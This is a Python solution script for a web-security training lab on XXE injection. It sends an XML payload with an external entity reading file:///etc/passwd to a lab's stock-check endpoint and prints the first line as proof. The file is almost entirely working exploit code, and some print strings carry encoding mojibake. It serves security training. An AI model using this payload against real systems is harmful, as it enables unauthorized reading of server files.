##########################################################################
#
# Lab: Exploiting XXE using external entities to retrieve files
#
# Hack Steps: 
#      1. Use an external entity to retrieve the content of /etc/passwd
#      2. Extract the first line as a proof
#
##########################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0af000310304fab2833292a8005e0036.web-security-academy.net" 

def main():
    print("â¦—#â¦˜ Injection point: " + Fore.YELLOW + "productId")
    print(Fore.WHITE + "â¦—2â¦˜ Using an external entity to retrieve the content of /etc/passwd.. ", end="", flush=True)

    payload = """<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <stockCheck>
                    <productId>
                        &xxe;
                    </productId>
                    <storeId>
                        1
                    </storeId>external entities
                    external entities
                </stockCheck>"""
    headers = { "Content-Type": "application/xml" }
    
    try:
        injection = requests.post(f"{LAB_URL}/product/stock", data=payload, headers=headers)

    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to check stock with the injected payload through exception")
        exit(1)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Extracting the first line as a proof.. ", end="", flush=True)
    
    first_line = re.findall("/(root:.*)\n", injection.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + first_line)
    print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()